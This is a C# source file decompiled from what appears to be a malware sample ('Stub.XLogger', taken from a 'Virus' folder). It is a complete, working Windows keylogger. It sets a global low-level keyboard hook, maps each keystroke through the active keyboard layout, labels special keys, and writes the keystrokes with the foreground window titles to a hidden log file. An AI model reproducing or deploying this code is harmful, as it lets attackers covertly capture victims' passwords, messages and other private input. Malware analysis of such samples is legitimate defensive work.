// Decompiled with JetBrains decompiler
// Type: Stub.XLogger
// Assembly: DesignV3Sv, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7FCAC0DD-9A5C-4DA4-BFB3-EE6355E60533
// Assembly location: C:\Users\hadesker\Desktop\Virus\DesignV\DesignV3Sv.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

#nullable disable
namespace Stub
{
  public class XLogger
  {
    private static string CurrentActiveWindowTitle;
    private const int WM_KEYDOWN = 256;
    private static XLogger.LowLevelKeyboardProc _proc = new XLogger.LowLevelKeyboardProc(XLogger.HookCallback);
    private static IntPtr _hookID = IntPtr.Zero;
    private static int WHKEYBOARDLL = 13;

    public static void callk()
    {
      XLogger._hookID = XLogger.SetHook(XLogger._proc);
      Application.Run();
    }

    private static IntPtr SetHook(XLogger.LowLevelKeyboardProc proc)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
        return XLogger.SetWindowsHookEx(XLogger.WHKEYBOARDLL, proc, XLogger.GetModuleHandle(currentProcess.ProcessName), 0U);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
      if (nCode >= 0 && wParam == (IntPtr) 256)
      {
        object obj1 = (object) Marshal.ReadInt32(lParam);
        object Left1 = (object) (((int) XLogger.GetKeyState(20) & (int) ushort.MaxValue) != 0);
        object obj2 = (object) (((int) XLogger.GetKeyState(160) & 32768) != 0 || ((int) XLogger.GetKeyState(161) & 32768) != 0);
        object Instance = (object) XLogger.KeyboardLayout(Conversions.ToUInteger(obj1));
        object obj3 = !Conversions.ToBoolean(Conversions.ToBoolean(Left1) || Conversions.ToBoolean(obj2) ? (object) true : (object) false) ? RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance, (Type) null, "ToLower", new object[0], (string[]) null, (Type[]) null, (bool[]) null)) : RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance, (Type) null, "ToUpper", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
        if (Conversions.ToInteger(obj1) >= 112 && Conversions.ToInteger(obj1) <= 135)
        {
          obj3 = (object) ("[" + Conversions.ToString(Conversions.ToInteger(obj1)) + "]");
        }
        else
        {
          string Left2 = ((Keys) Conversions.ToInteger(obj1)).ToString();
          if (Operators.CompareString(Left2, "Space", false) == 0)
            obj3 = (object) "[SPACE]";
          else if (Operators.CompareString(Left2, "Return", false) == 0)
            obj3 = (object) "[ENTER]";
          else if (Operators.CompareString(Left2, "Escape", false) == 0)
            obj3 = (object) "[ESC]";
          else if (Operators.CompareString(Left2, "LControlKey", false) == 0)
            obj3 = (object) "[CTRL]";
          else if (Operators.CompareString(Left2, "RControlKey", false) == 0)
            obj3 = (object) "[CTRL]";
          else if (Operators.CompareString(Left2, "RShiftKey", false) == 0)
            obj3 = (object) "[Shift]";
          else if (Operators.CompareString(Left2, "LShiftKey", false) == 0)
            obj3 = (object) "[Shift]";
          else if (Operators.CompareString(Left2, "Back", false) == 0)
            obj3 = (object) "[Back]";
          else if (Operators.CompareString(Left2, "LWin", false) == 0)
            obj3 = (object) "[WIN]";
          else if (Operators.CompareString(Left2, "Tab", false) == 0)
            obj3 = (object) "[Tab]";
          else if (Operators.CompareString(Left2, "Capital", false) == 0)
            obj3 = !Operators.ConditionalCompareObjectEqual(Left1, (object) true, false) ? (object) "[CAPSLOCK: ON]" : (object) "[CAPSLOCK: OFF]";
        }
        using (StreamWriter streamWriter = new StreamWriter(Settings.LoggerPath, true))
        {
          if (object.Equals((object) XLogger.CurrentActiveWindowTitle, (object) XLogger.GetActiveWindowTitle()))
          {
            streamWriter.Write(RuntimeHelpers.GetObjectValue(obj3));
          }
          else
          {
            streamWriter.WriteLine(Environment.NewLine);
            streamWriter.WriteLine("###  " + XLogger.GetActiveWindowTitle() + " ###");
            streamWriter.Write(RuntimeHelpers.GetObjectValue(obj3));
          }
        }
      }
      return XLogger.CallNextHookEx(XLogger._hookID, nCode, wParam, lParam);
    }

    private static string KeyboardLayout(uint vkCode)
    {
      uint lpdwProcessId = 0;
      try
      {
        StringBuilder pwszBuff = new StringBuilder();
        object lpKeyState = (object) new byte[256];
        if (!XLogger.GetKeyboardState((byte[]) lpKeyState))
          return "";
        object obj = (object) XLogger.MapVirtualKey(vkCode, 0U);
        IntPtr keyboardLayout = XLogger.GetKeyboardLayout(XLogger.GetWindowThreadProcessId(XLogger.GetForegroundWindow(), out lpdwProcessId));
        XLogger.ToUnicodeEx(vkCode, Conversions.ToUInteger(obj), (byte[]) lpKeyState, pwszBuff, 5, 0U, keyboardLayout);
        return pwszBuff.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return ((Keys) checked ((int) vkCode)).ToString();
    }

    private static string GetActiveWindowTitle()
    {
      uint lpdwProcessId = 0;
      string activeWindowTitle;
      try
      {
        int windowThreadProcessId = (int) XLogger.GetWindowThreadProcessId(XLogger.GetForegroundWindow(), out lpdwProcessId);
        object processById = (object) Process.GetProcessById(checked ((int) lpdwProcessId));
        object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, (Type) null, "MainWindowTitle", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
        if (string.IsNullOrWhiteSpace(Conversions.ToString(objectValue)))
          objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, (Type) null, "ProcessName", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
        XLogger.CurrentActiveWindowTitle = Conversions.ToString(objectValue);
        activeWindowTitle = Conversions.ToString(objectValue);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        activeWindowTitle = "???";
        ProjectData.ClearProjectError();
      }
      return activeWindowTitle;
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int idHook,
      XLogger.LowLevelKeyboardProc lpfn,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hhk,
      int nCode,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern short GetKeyState(int keyCode);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
      uint wVirtKey,
      uint wScanCode,
      byte[] lpKeyState,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pwszBuff,
      int cchBuff,
      uint wFlags,
      IntPtr dwhkl);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
